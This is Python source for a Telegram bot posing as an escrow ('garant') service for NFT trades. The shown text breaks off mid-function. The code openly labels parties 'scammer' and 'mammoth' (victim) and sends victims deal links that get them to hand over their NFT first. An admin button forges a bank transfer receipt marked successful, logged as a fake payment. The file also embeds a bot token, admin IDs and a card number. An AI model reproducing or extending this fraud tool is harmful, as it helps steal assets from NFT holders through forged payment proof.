"""
NFT Garant Bot - Версия с улучшенным интерфейсом
Токен: 8031857941:AAHScgAH_2KthkTdokaio9UQS3SIkyWJv8Q
Админы: 6400547924, 7170622064
Карта гаранта: 5447147777488296
"""

import json
import sqlite3
import random
import time
import os
import sys
import re
from datetime import datetime
import traceback
from urllib.parse import quote
import requests

# --- Инициализация цветов ---
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    class Fore:
        GREEN = RED = YELLOW = BLUE = MAGENTA = CYAN = WHITE = BLACK = RESET = ''
    class Back:
        BLACK = RESET = ''
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "8031857941:AAHScgAH_2KthkTdokaio9UQS3SIkyWJv8Q"
ADMIN_IDS = [6400547924, 7170622064]
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
POLL_TIMEOUT = 5
SCAMMER_CARD = "5447147777488296"
MAX_RETRIES = 3
RETRY_DELAY = 2

# ==================== УТИЛИТЫ ДЛЯ ОТОБРАЖЕНИЯ ====================
def print_colored(text, color=Fore.WHITE, style=Style.NORMAL, end='\n'):
    if COLORAMA_AVAILABLE:
        print(style + color + text + Style.RESET_ALL, end=end)
    else:
        print(text, end=end)

def print_header(text):
    print()
    border = "═" * (len(text) + 2)
    print_colored("╔" + border + "╗", Fore.CYAN, Style.BRIGHT)
    print_colored("║ " + text + " ║", Fore.CYAN, Style.BRIGHT)
    print_colored("╚" + border + "╝", Fore.CYAN, Style.BRIGHT)
    print()

def print_section(text):
    print()
    dashes = "─" * (40 - len(text) - 3)
    print_colored("┌─ " + text + " " + dashes, Fore.MAGENTA)

def print_info(label, value, value_color=Fore.GREEN):
    print_colored("  • " + label + ": ", Fore.WHITE, end="")
    print_colored(str(value), value_color)

def print_success(text):
    print_colored("  ✅ " + text, Fore.GREEN)

def print_warning(text):
    print_colored("  ⚠️  " + text, Fore.YELLOW)

def print_error(text):
    print_colored("  ❌ " + text, Fore.RED)

def print_divider(symbol="─", length=60, color=Fore.CYAN):
    if COLORAMA_AVAILABLE:
        print(color + symbol * length + Style.RESET_ALL)
    else:
        print(symbol * length)

def print_centered(text, width=60, color=Fore.CYAN, style=Style.BRIGHT):
    padding = (width - len(text)) // 2
    left_pad = " " * padding
    right_pad = " " * (width - len(text) - padding)
    print_colored(left_pad + text + right_pad, color, style)

def print_logo():
    print_divider("═", 60, Fore.MAGENTA)
    print_centered("🎭 NFT GARANT BOT 🎭", 60, Fore.MAGENTA, Style.BRIGHT)
    print_divider("═", 60, Fore.MAGENTA)
    print()
    print_centered("Версия: 2.0.0 | Режим: SCAM/GARANT", 60, Fore.YELLOW)
    print_centered("Дата: " + datetime.now().strftime("%d.%m.%Y %H:%M:%S"), 60, Fore.WHITE)
    print_divider("═", 60, Fore.MAGENTA)

# ==================== БАЗА ДАННЫХ ====================
def init_database():
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS deals (
                id TEXT PRIMARY KEY,
                scammer_id INTEGER,
                mammoth_id INTEGER,
                price REAL,
                gift_link TEXT,
                mammoth_card TEXT,
                scammer_card TEXT,
                status TEXT DEFAULT 'active',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                deal_link TEXT,
                mammoth_confirmed INTEGER DEFAULT 0,
                scammer_confirmed INTEGER DEFAULT 0,
                fake_payment_sent INTEGER DEFAULT 0
            )
        ''')
        
        cursor.execute("PRAGMA table_info(deals)")
        columns = [column[1] for column in cursor.fetchall()]
        
        if 'fake_payment_sent' not in columns:
            cursor.execute('ALTER TABLE deals ADD COLUMN fake_payment_sent INTEGER DEFAULT 0')
        if 'deal_link' not in columns:
            cursor.execute('ALTER TABLE deals ADD COLUMN deal_link TEXT')
        if 'mammoth_confirmed' not in columns:
            cursor.execute('ALTER TABLE deals ADD COLUMN mammoth_confirmed INTEGER DEFAULT 0')
        if 'scammer_confirmed' not in columns:
            cursor.execute('ALTER TABLE deals ADD COLUMN scammer_confirmed INTEGER DEFAULT 0')
        
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_deal_id ON deals(id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_scammer_id ON deals(scammer_id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_mammoth_id ON deals(mammoth_id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_status ON deals(status)')
        
        conn.commit()
        conn.close()
        print_success("База данных инициализирована")
        return True
    except Exception as e:
        print_error("Ошибка БД: " + str(e))
        traceback.print_exc()
        return False

def check_database():
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM deals')
        count = cursor.fetchone()[0]
        
        cursor.execute('SELECT id, status, created_at FROM deals ORDER BY created_at DESC LIMIT 5')
        recent_deals = cursor.fetchall()
        
        conn.close()
        
        print_section("СОСТОЯНИЕ БАЗЫ ДАННЫХ")
        print_info("Всего сделок", count)
        if recent_deals:
            print_info("Последние сделки", "")
            for deal_id, status, created_at in recent_deals:
                print_colored("    - " + deal_id + " (" + status + ", создана: " + created_at + ")", Fore.CYAN)
        else:
            print_info("Сделок", "нет")
        
        return True
    except Exception as e:
        print_error("Ошибка проверки базы данных: " + str(e))
        return False

def save_deal(deal_id, scammer_id, price, gift_link, mammoth_card, deal_link):
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        
        scammer_card_clean = re.sub(r'\D', '', SCAMMER_CARD)
        
        cursor.execute('''
            INSERT OR REPLACE INTO deals 
            (id, scammer_id, price, gift_link, mammoth_card, scammer_card, deal_link, 
             status, mammoth_confirmed, scammer_confirmed, fake_payment_sent)
            VALUES (?, ?, ?, ?, ?, ?, ?, 'active', 0, 0, 0)
        ''', (deal_id, scammer_id, price, gift_link, mammoth_card, scammer_card_clean, deal_link))
        
        conn.commit()
        conn.close()
        print_success("Сделка " + deal_id + " сохранена")
        return True
    except Exception as e:
        print_error("Ошибка сохранения сделки: " + str(e))
        traceback.print_exc()
        return False

def get_deal(deal_id):
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, scammer_id, mammoth_id, price, gift_link, 
                   mammoth_card, scammer_card, status, deal_link,
                   mammoth_confirmed, scammer_confirmed, fake_payment_sent
            FROM deals WHERE id = ?
        ''', (deal_id,))
        
        row = cursor.fetchone()
        conn.close()
        
        if row:
            columns = ['id', 'scammer_id', 'mammoth_id', 'price', 'gift_link', 
                      'mammoth_card', 'scammer_card', 'status', 'deal_link',
                      'mammoth_confirmed', 'scammer_confirmed', 'fake_payment_sent']
            return dict(zip(columns, row))
        return None
    except Exception as e:
        print_error("Ошибка получения сделки: " + str(e))
        return None

def set_mammoth(deal_id, mammoth_id):
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        
        cursor.execute('SELECT mammoth_id FROM deals WHERE id = ? AND status = "active"', (deal_id,))
        row = cursor.fetchone()
        if row and row[0] is not None:
            conn.close()
            return False
        
        cursor.execute('UPDATE deals SET mammoth_id = ?, status = "waiting" WHERE id = ? AND status = "active"', (mammoth_id, deal_id))
        updated = cursor.rowcount > 0
        conn.commit()
        conn.close()
        
        if updated:
            print_success("Мамонт " + str(mammoth_id) + " привязан к сделке " + deal_id)
        return updated
    except Exception as e:
        print_error("Ошибка привязки мамонта: " + str(e))
        return False

def confirm_deal(deal_id, user_type):
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        
        cursor.execute('SELECT mammoth_confirmed, scammer_confirmed FROM deals WHERE id = ?', (deal_id,))
        row = cursor.fetchone()
        if not row:
            conn.close()
            return 'error'
            
        mammoth_conf, scammer_conf = row
        
        if user_type == 'scammer':
            cursor.execute('UPDATE deals SET scammer_confirmed = 1 WHERE id = ?', (deal_id,))
            scammer_conf = 1
        else:
            cursor.execute('UPDATE deals SET mammoth_confirmed = 1 WHERE id = ?', (deal_id,))
            mammoth_conf = 1
        
        result = 'partial'
        if mammoth_conf == 1 and scammer_conf == 1:
            cursor.execute('UPDATE deals SET status = "completed" WHERE id = ?', (deal_id,))
            result = 'completed'
        
        conn.commit()
        conn.close()
        print_success("Подтверждение от " + user_type + " для сделки " + deal_id + ": " + result)
        return result
    except Exception as e:
        print_error("Ошибка подтверждения сделки: " + str(e))
        traceback.print_exc()
        return 'error'

def set_fake_payment_sent(deal_id):
    try:
        conn = sqlite3.connect("deals.db", check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('UPDATE deals SET fake_payment_sent = 1 WHERE id = ?', (deal_id,))
        conn.commit()
        conn.close()
        print_success("Фейк платеж для сделки " + deal_id + " отмечен как отправленный")
        return True
    except Exception as e:
        print_error("Ошибка отметки фейк платежа: " + str(e))
        return False

# ==================== TELEGRAM API ====================
def telegram_request(method, params=None, data=None, retry_count=0):
    url = TELEGRAM_API + "/" + method
    
    try:
        if method == 'getUpdates' and params:
            response = requests.post(url, params=params, timeout=POLL_TIMEOUT + 5)
        elif data:
            headers = {'Content-Type': 'application/json'}
            response = requests.post(url, json=data, headers=headers, timeout=10)
        else:
            response = requests.post(url, timeout=10)
        
        response.raise_for_status()
        result = response.json()
        
        if not result.get('ok', False):
            print_warning("API " + method + " вернул ошибку: " + str(result))
        
        return result
        
    except requests.exceptions.Timeout:
        print_warning("Таймаут запроса " + method)
        if retry_count < MAX_RETRIES:
            print_warning("Повторная попытка " + str(retry_count + 1) + "/" + str(MAX_RETRIES) + "...")
            time.sleep(RETRY_DELAY)
            return telegram_request(method, params, data, retry_count + 1)
        return {'ok': False, 'description': 'Timeout'}
        
    except requests.exceptions.RequestException as e:
        print_error("Ошибка сети API " + method + ": " + str(e))
        if retry_count < MAX_RETRIES:
            print_warning("Повторная попытка " + str(retry_count + 1) + "/" + str(MAX_RETRIES) + "...")
            time.sleep(RETRY_DELAY)
            return telegram_request(method, params, data, retry_count + 1)
        return {'ok': False, 'description': str(e)}
        
    except Exception as e:
        print_error("API Error " + method + ": " + str(e))
        traceback.print_exc()
        return {'ok': False, 'description': str(e)}

def send_message(chat_id, text, keyboard=None, parse_mode='HTML'):
    data = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': parse_mode,
        'disable_web_page_preview': True
    }
    
    if keyboard:
        data['reply_markup'] = keyboard
    
    return telegram_request('sendMessage', data=data)

def answer_callback_query(callback_query_id, text=None, show_alert=False):
    data = {
        'callback_query_id': callback_query_id,
        'show_alert': show_alert
    }
    
    if text:
        data['text'] = text
    
    return telegram_request('answerCallbackQuery', data=data)

# ==================== УТИЛИТЫ ====================
def generate_deal_id():
    timestamp = int(time.time()) % 100000
    random_part = random.randint(1000, 9999)
    return "NFT" + str(timestamp) + str(random_part)

def validate_card(card_number):
    if not card_number:
        return False
    card_clean = re.sub(r'\D', '', str(card_number))
    return 16 <= len(card_clean) <= 19

def format_card(card_number):
    if not card_number:
        return "Не указана"
    card_clean = re.sub(r'\D', '', str(card_number))
    if len(card_clean) >= 16:
        parts = [card_clean[i:i+4] for i in range(0, min(len(card_clean), 16), 4)]
        return ' '.join(parts)
    return card_clean

def format_price(price):
    try:
        price_num = float(price)
        return f"{price_num:,.0f}".replace(',', ' ') + ' ₽'
    except:
        return str(price) + ' ₽'

def cleanup_user_state(user_id, user_states):
    try:
        if user_id in user_states:
            del user_states[user_id]
    except Exception as e:
        print_warning("Ошибка очистки состояния: " + str(e))

def is_admin(user_id):
    return user_id in ADMIN_IDS

def generate_fake_bank_receipt(deal):
    receipt_id = random.randint(1000000000, 9999999999)
    date = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    
    mammoth_card_clean = re.sub(r'\D', '', str(deal.get('mammoth_card', '')))
    scammer_card_clean = re.sub(r'\D', '', str(deal.get('scammer_card', '')))
    
    mammoth_last4 = mammoth_card_clean[-4:] if len(mammoth_card_clean) >= 4 else '0000'
    scammer_last4 = scammer_card_clean[-4:] if len(scammer_card_clean) >= 4 else '0000'
    
    receipt = (
        "💳 <b>БАНКОВСКИЙ ЧЕК</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🏦 <b>Операция:</b> Перевод средств\n"
        "📄 <b>Номер операции:</b> " + str(receipt_id) + "\n"
        "🕐 <b>Дата и время:</b> " + date + "\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "👤 <b>Отправитель:</b>\n"
        "Карта: •••• " + scammer_last4 + "\n"
        "Сумма списания: " + format_price(deal.get('price', 0)) + "\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "👤 <b>Получатель:</b>\n"
        "Карта: •••• " + mammoth_last4 + "\n"
        "Сумма зачисления: " + format_price(deal.get('price', 0)) + "\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💸 <b>Комиссия:</b> 0 ₽\n"
        "💰 <b>Итого:</b> " + format_price(deal.get('price', 0)) + "\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "✅ <b>Статус:</b> УСПЕШНО\n"
        "⏳ <b>До зачисления:</b> ~15-30 минут\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "<i>Средства успешно списаны и отправлены на обработку</i>"
    )
    
    return receipt

# ==================== ОСНОВНАЯ ЛОГИКА ====================
class NFTBot:
    def __init__(self):
        self.bot_username = None
        self.last_update_id = 0
        self.user_states = {}
        self.running = True
        
        print_logo()
        print_section("ИНИЦИАЛИЗАЦИЯ БОТА")
        print_info("Токен бота", BOT_TOKEN[:12] + "..." + BOT_TOKEN[-4:])
        print_info("ID админов", ", ".join(map(str, ADMIN_IDS)))
        print_info("Карта гаранта", SCAMMER_CARD[:4] + " **** **** " + SCAMMER_CARD[-4:])
        
        print_section("ПОДКЛЮЧЕНИЕ К TELEGRAM API")
        print_info("Попыток подключения", MAX_RETRIES)
        
        for attempt in range(MAX_RETRIES):
            try:
                print_colored("  ⟳  Попытка " + str(attempt + 1) + "/" + str(MAX_RETRIES) + "...", Fore.CYAN, end="\r")
                bot_info = telegram_request('getMe')
                
                if bot_info and bot_info.get('ok'):
                    self.bot_username = bot_info['result'].get('username')
                    print_success("Username бота: @" + str(self.bot_username))
                    break
                else:
                    error_msg = bot_info.get('description', 'Неизвестная ошибка') if bot_info else 'Нет ответа от сервера'
                    print_error("Попытка " + str(attempt + 1) + ": " + error_msg)
                    
                    if attempt < MAX_RETRIES - 1:
                        print_warning("Повтор через 3 секунды...")
                        time.sleep(3)
            except Exception as e:
                print_error("Попытка " + str(attempt + 1) + ": " + str(e)[:50])
                if attempt < MAX_RETRIES - 1:
                    time.sleep(3)
        
        if not self.bot_username:
            print_warning("Не удалось получить username бота")
            self.bot_username = "nft_garant_bot"
            print_warning("Используем временный username: @" + self.bot_username)
        
        if not BOT_TOKEN or len(BOT_TOKEN) < 10:
            print_error("Ошибка: Неверный токен бота")
            sys.exit(1)
        
        print_section("ИНИЦИАЛИЗАЦИЯ БАЗЫ ДАННЫХ")
        if not init_database():
            print_error("Не удалось инициализировать БД")
            sys.exit(1)
        
        check_database()
        
        print_section("КОНФИГУРАЦИЯ БОТА")
        print_info("Токен", BOT_TOKEN[:10] + "...")
        print_info("Username", "@" + self.bot_username)
        print_info("Админы", str(len(ADMIN_IDS)) + " пользователей")
        print_success("Бот инициализирован")
    
    def start_polling(self):
        print_header("БОТ ЗАПУЩЕН")
        print_centered("📡 Ожидание команд...", 60, Fore.GREEN)
        print_centered("🛑 Ctrl+C для остановки", 60, Fore.YELLOW)
        print_divider("=", 60, Fore.CYAN)
        
        test_result = telegram_request('getMe')
        if test_result and test_result.get('ok'):
            print_success("Подключение к Telegram API успешно")
        else:
            print_error("Ошибка подключения к Telegram API")
            print_error("Ответ сервера: " + str(test_result))
        
        while self.running:
            try:
                updates = self.get_updates()
                if updates:
                    for update in updates:
                        self.process_update(update)
                time.sleep(0.1)
            except KeyboardInterrupt:
                print()
                print_header("ОСТАНОВКА БОТА")
                print_centered("Бот остановлен пользователем", 60, Fore.RED)
                self.running = False
                break
            except Exception as e:
                print_error("Ошибка в основном цикле: " + str(e))
                time.sleep(1)
    
    def get_updates(self):
        try:
            params = {
                'timeout': POLL_TIMEOUT,
                'offset': self.last_update_id + 1,
                'allowed_updates': ['message', 'callback_query']
            }
            
            result = telegram_request('getUpdates', params=params)
            
            if result and result.get('ok'):
                updates = result.get('result', [])
                if updates:
                    self.last_update_id = updates[-1]['update_id']
                return updates
            return []
        except Exception as e:
            print_error("Ошибка в get_updates: " + str(e))
            return []
    
    def process_update(self, update):
        try:
            if 'message' in update:
                self.process_message(update['message'])
            elif 'callback_query' in update:
                self.process_callback(update['callback_query'])
        except Exception as e:
            print_error("Ошибка обработки обновления: " + str(e))
            traceback.print_exc()
    
    def process_message(self, message):
        try:
            chat_id = message['chat']['id']
            user_id = message['from']['id']
            text = message.get('text', '').strip()
            
            if user_id in self.user_states:
                state = self.user_states[user_id]
                if state.get('waiting_for_price'):
                    self.handle_price_input(chat_id, user_id, text)
                    return
                elif state.get('waiting_for_link'):
                    self.handle_link_input(chat_id, user_id, text)
                    return
                elif state.get('waiting_for_card'):
                    self.handle_card_input(chat_id, user_id, text)
                    return
            
            if text.startswith('/start'):
                parts = text.split()
                if len(parts) > 1:
                    deal_id = parts[1].strip()
                    self.handle_mammoth_start(chat_id, user_id, deal_id)
                    return
                self.handle_start(chat_id, user_id)
            
            elif is_admin(user_id):
                if text == '/skamoffers':
                    self.handle_create_menu(chat_id)
                elif text == '/offers':
                    self.handle_offers(chat_id)
                elif text == '/link':
                    self.handle_get_link(chat_id, user_id)
                elif text == '/help':
                    self.handle_help(chat_id, user_id)
                elif text.startswith('/create'):
                    self.handle_quick_create(chat_id, user_id, text)
                elif text == '/status':
                    self.handle_status(chat_id)
                else:
                    self.handle_unknown_command(chat_id, user_id)
            else:
                if text.startswith('/'):
                    self.handle_unknown_command(chat_id, user_id)
                else:
                    self.handle_start(chat_id, user_id)
                    
        except Exception as e:
            print_error("Ошибка обработки сообщения: " + str(e))
            traceback.print_exc()
    
    def process_callback(self, callback):
        try:
            query_id = callback['id']
            user_id = callback['from']['id']
            data = callback.get('data', '')
            
            answer_callback_query(query_id, "⏳ Обработка...")
            
            if data == 'create_deal':
                message = callback.get('message', {})
                chat_id = message.get('chat', {}).get('id')
                if chat_id:
                    self.handle_create_deal_start(chat_id, user_id)
            elif data.startswith('confirm_scammer_'):
                deal_id = data.replace('confirm_scammer_', '')
                self.handle_scammer_confirm(query_id, deal_id, user_id)
            elif data.startswith('confirm_mammoth_'):
                deal_id = data.replace('confirm_mammoth_', '')
                self.handle_mammoth_confirm(query_id, deal_id, user_id)
            elif data.startswith('fake_payment_'):
                deal_id = data.replace('fake_payment_', '')
                self.handle_fake_payment(query_id, deal_id, user_id)
            else:
                print_warning("Неизвестный callback data: " + data)
                answer_callback_query(query_id, "❌ Неизвестная команда")
        except Exception as e:
            print_error("Ошибка обработки callback: " + str(e))
            traceback.print_exc()
    
    def handle_start(self, chat_id, user_id):
        is_admin_user = is_admin(user_id)
        
        message = (
            "🎉 <b>NFT GARANT BOT</b>\n\n"
            "👤 <b>Ваш ID:</b> <code>" + str(user_id) + "</code>\n"
            + ("🎭 <b>Роль:</b> ГАРАНТ (отправляет деньги)\n" if is_admin_user else "🎭 <b>Роль:</b> ПОЛУЧАТЕЛЬ (отправляет NFT)\n") +
            "🕐 <b>Время:</b> " + datetime.now().strftime('%H:%M:%S') + "\n\n"
        )
        
        if is_admin_user:
            message += (
                "<b>👑 КОМАНДЫ АДМИНА:</b>\n"
                "• /skamoffers - Создать сделку\n"
                "• /offers - Активные сделки\n"
                "• /link - Получить ссылку\n"
                "• /status - Статус бота\n"
                "• /help - Помощь\n\n"
                "<b>Быстрое создание:</b>\n"
                "<code>/create [сумма] [ссылка] [карта]</code>"
            )
        else:
            message += (
                "<b>📋 КАК РАБОТАТЬ:</b>\n"
                "• Получите ссылку от гаранта\n"
                "• Перейдите по ссылке\n"
                "• Отправьте NFT и подтвердите\n"
                "• Ожидайте подтверждения от гаранта\n\n"
                "🛡️ <b>Гарантии безопасности</b>"
            )
        
        send_message(chat_id, message)
    
    def handle_create_menu(self, chat_id):
        message = (
            "💰 <b>СОЗДАНИЕ СДЕЛКИ</b>\n\n"
            "Гарант отправляет деньги → Получатель отправляет NFT\n\n"
            "<b>Быстрая команда:</b>\n"
            "<code>/create [сумма] [ссылка_на_NFT] [карта_получателя]</code>\n\n"
            "<b>Пример:</b>\n"
            "<code>/create 15000 https://opensea.io/nft/123 1234567812345678</code>\n\n"
            "<b>Или нажмите кнопку для пошагового создания:</b>"
        )
        
        keyboard = {
            'inline_keyboard': [[
                {'text': '🎁 СОЗДАТЬ СДЕЛКУ', 'callback_data': 'create_deal'}
            ]]
        }
        
        send_message(chat_id, message, keyboard)
    
    def handle_create_deal_start(self, chat_id, user_id):
        if not is_admin(user_id):
            send_message(chat_id, "❌ Доступ запрещен. Только для гарантов.")
            return
        
        self.user_states[user_id] = {
            'chat_id': chat_id,
            'waiting_for_price': True,
            'deal_data': {}
        }
        
        send_message(chat_id, "💰 Введите сумму в рублях (сколько вы отправляете):")
    
    def handle_price_input(self, chat_id, user_id, text):
        if user_id not in self.user_states:
            send_message(chat_id, "❌ Сессия устарела. Начните заново.")
            cleanup_user_state(user_id, self.user_states)
            return
        
        try:
            clean_text = text.replace(' ', '').replace(',', '.')
            price = float(clean_text)
            
            if price <= 0:
                send_message(chat_id, "❌ Сумма должна быть больше 0")
                return
            
            if price > 10000000:
                send_message(chat_id, "❌ Сумма слишком большая. Максимум 10,000,000 ₽")
                return
            
            self.user_states[user_id]['deal_data']['price'] = price
            self.user_states[user_id]['waiting_for_price'] = False
            self.user_states[user_id]['waiting_for_link'] = True
            
            send_message(chat_id, "🎨 Введите ссылку на NFT (которое должен отправить получатель):")
        except ValueError:
            send_message(chat_id, "❌ Неверный формат суммы. Введите число (например: 15000 или 15000.50)")
    
    def handle_link_input(self, chat_id, user_id, text):
        if user_id not in self.user_states:
            send_message(chat_id, "❌ Сессия устарела. Начните заново.")
            cleanup_user_state(user_id, self.user_states)
            return
        
        gift_link = text.strip()
        if not gift_link.startswith(('http://', 'https://')):
            gift_link = 'https://' + gift_link
        
        if len(gift_link) < 10 or ' ' in gift_link:
            send_message(chat_id, "❌ Неверная ссылка. Попробуйте еще раз.")
            return
        
        self.user_states[user_id]['deal_data']['gift_link'] = gift_link
        self.user_states[user_id]['waiting_for_link'] = False
        self.user_states[user_id]['waiting_for_card'] = True
        
        send_message(chat_id, "💳 Введите номер карты получателя (16-19 цифр):")
    
    def handle_card_input(self, chat_id, user_id, text):
        if user_id not in self.user_states:
            send_message(chat_id, "❌ Сессия устарела. Начните заново.")
            cleanup_user_state(user_id, self.user_states)
            return
        
        if not validate_card(text):
            send_message(chat_id, "❌ Неверный номер карты. Введите 16-19 цифр")
            return
        
        deal_data = self.user_states[user_id]['deal_data']
        mammoth_card = format_card(text)
        
        deal_id = generate_deal_id()
        state_chat_id = self.user_states[user_id].get('chat_id', chat_id)
        
        if not self.bot_username:
            send_message(state_chat_id, "❌ Ошибка: не удалось получить username бота")
            cleanup_user_state(user_id, self.user_states)
            return
        
        deal_link = "https://t.me/" + self.bot_username + "?start=" + deal_id
        
        success = save_deal(
            deal_id, user_id, deal_data['price'],
            deal_data['gift_link'], mammoth_card, deal_link
        )
        
        if not success:
            send_message(state_chat_id, "❌ Ошибка сохранения сделки")
            cleanup_user_state(user_id, self.user_states)
            return
        
        scammer_card_formatted = format_card(SCAMMER_CARD)
        
        message = (
            "✅ <b>СДЕЛКА СОЗДАНА!</b>\n\n"
            "<b>ВЫ: Гарант (отправляете деньги)</b>\n"
            "<b>ПОЛУЧАТЕЛЬ: Отправляет NFT</b>\n\n"
            "📋 <b>Детали:</b>\n"
            "├ ID: <code>" + deal_id + "</code>\n"
            "├ Сумма: <b>" + format_price(deal_data['price']) + "</b>\n"
            "├ NFT от получателя: " + deal_data['gift_link'] + "\n"
            "├ Карта получателя: <code>" + mammoth_card + "</code>\n"
            "└ Ваша карта: <code>" + scammer_card_formatted + "</code>\n\n"
            "🔗 <b>Ссылка для получателя:</b>\n"
            "<code>" + deal_link + "</code>\n\n"
            "📝 <b>Инструкция:</b>\n"
            "1. Отправьте ссылку получателю\n"
            "2. Получатель отправит NFT и подтвердит\n"
            "3. Вы отправите деньги и подтвердите\n\n"
            "<b>Дополнительное действие:</b>"
        )
        
        keyboard = {
            'inline_keyboard': [
                [
                    {'text': '✅ Подтверждаю отправку денег', 'callback_data': 'confirm_scammer_' + deal_id}
                ],
                [
                    {'text': '💸 Отправить фейк платеж', 'callback_data': 'fake_payment_' + deal_id}
                ]
            ]
        }
        
        send_message(state_chat_id, message, keyboard)
        cleanup_user_state(user_id, self.user_states)
    
    def handle_quick_create(self, chat_id, user_id, text):
        if not is_admin(user_id):
            send_message(chat_id, "❌ Доступ запрещен. Только для гарантов.")
            return
        
        parts = text.split(maxsplit=3)
        if len(parts) < 4:
            send_message(chat_id,
                "❌ Неверный формат\n"
                "Используйте: /create [сумма] [ссылка] [карта]\n"
                "Пример: /create 15000 https://opensea.io/nft/123 1234567812345678")
            return
        
        try:
            price_str = parts[1].replace(',', '.')
            price = float(price_str)
            gift_link = parts[2]
            mammoth_card_raw = parts[3]
            
            if price <= 0:
                send_message(chat_id, "❌ Сумма должна быть больше 0")
                return
            
            if not validate_card(mammoth_card_raw):
                send_message(chat_id, "❌ Неверный номер карты")
                return
            
            if not gift_link.startswith(('http://', 'https://')):
                gift_link = 'https://' + gift_link
            
            mammoth_card = format_card(mammoth_card_raw)
            deal_id = generate_deal_id()
            
            if not self.bot_username:
                send_message(chat_id, "❌ Ошибка: не удалось получить username бота")
                return
            
            deal_link = "https://t.me/" + self.bot_username + "?start=" + deal_id
            
            success = save_deal(deal_id, user_id, price, gift_link, mammoth_card, deal_link)
            
            if not success:
                send_message(chat_id, "❌ Ошибка сохранения сделки")
                return
            
            scammer_card_formatted = format_card(SCAMMER_CARD)
            
            message = (
                "✅ <b>СДЕЛКА СОЗДАНА!</b>\n\n"
                "<b>ВЫ: Гарант (отправляете деньги)</b>\n"
                "<b>ПОЛУЧАТЕЛЬ: Отправляет NFT</b>\n\n"
                "📋 <b>Детали:</b>\n"
                "├ ID: <code>" + deal_id + "</code>\n"
                "├ Сумма: <b>" + format_price(price) + "</b>\n"
                "├ NFT от получателя: " + gift_link + "\n"
                "├ Карта получателя: <code>" + mammoth_card + "</code>\n"
                "└ Ваша карта: <code>" + scammer_card_formatted + "</code>\n\n"
                "🔗 <b>Ссылка для получателя:</b>\n"
                "<code>" + deal_link + "</code>\n\n"
                "<b>Дополнительное действие:</b>"
            )
            
            keyboard = {
                'inline_keyboard': [
                    [
                        {'text': '✅ Подтверждаю отправку денег', 'callback_data': 'confirm_scammer_' + deal_id}
                    ],
                    [
                        {'text': '💸 Отправить фейк платеж', 'callback_data': 'fake_payment_' + deal_id}
                    ]
                ]
            }
            
            send_message(chat_id, message, keyboard)
            
        except ValueError:
            send_message(chat_id, "❌ Неверный формат суммы")
        except Exception as e:
            send_message(chat_id, "❌ Ошибка: " + str(e)[:100])
            print_error("Ошибка в быстром создании: " + str(e))
            traceback.print_exc()
    
    def handle_mammoth_start(self, chat_id, user_id, deal_id):
        if is_admin(user_id):
            send_message(chat_id, "⚠️ Вы гарант. Для создания сделок используйте /skamoffers")
            return
        
        clean_deal_id = deal_id.strip()
        print_info("Поиск сделки для мамонта", clean_deal_id)
        
        deal = get_deal(clean_deal_id)
        
        if not deal:
            print_error("Сделка '" + clean_deal_id + "' не найдена в базе данных")
            send_message(chat_id, "❌ Сделка '" + clean_deal_id + "' не найдена")
            return
        
        print_success("Сделка найдена: ID=" + deal['id'] + ", статус=" + deal['status'])
        
        if deal['status'] != 'active':
            status_msg = {
                'waiting': 'ожидает подтверждения',
                'completed': 'завершена',
                'cancelled': 'отменена'
            }.get(deal['status'], deal['status'])
            
            send_message(chat_id, "⚠️ Сделка " + status_msg)
            return
        
        success = set_mammoth(deal['id'], user_id)
        
        if not success:
            send_message(chat_id, "⚠️ Сделка уже занята другим пользователем")
            return
        
        scammer_card_formatted = format_card(deal.get('scammer_card', SCAMMER_CARD))
        
        message = (
            "🎁 <b>ВЫ ПОЛУЧАТЕЛЬ NFT</b>\n\n"
            "<b>Вам предлагают сделку!</b>\n\n"
            "📋 <b>Детали:</b>\n"
            "├ ID: <code>" + deal['id'] + "</code>\n"
            "├ Сумма: <b>" + format_price(deal['price']) + "</b>\n"
            "├ Ваше NFT для отправки: " + deal['gift_link'] + "\n"
            "├ Ваша карта для получения: <code>" + deal['mammoth_card'] + "</code>\n"
            "└ Карта бота гаранта (С нее вы получите платеж): <code>" + scammer_card_formatted + "</code>\n\n"
            "🛡️ <b>Процесс:</b>\n"
            "1. Вы отправляете NFT\n"
            "2. Гарант отправляет деньги\n"
            "3. Вы подтверждаете отправку NFT\n"
            "4. Гарант подтверждает отправку денег\n\n"
            "<b>После отправки NFT нажмите кнопку:</b>"
        )
        
        keyboard = {
            'inline_keyboard': [[
                {'text': '✅ Подтверждаю отправку NFT', 'callback_data': 'confirm_mammoth_' + deal["id"]}
            ]]
        }
        
        send_message(chat_id, message, keyboard)
    
    def handle_scammer_confirm(self, query_id, deal_id, user_id):
        deal = get_deal(deal_id)
        
        if not deal:
            answer_callback_query(query_id, "❌ Сделка не найдена", show_alert=True)
            return
        
        if user_id != deal['scammer_id']:
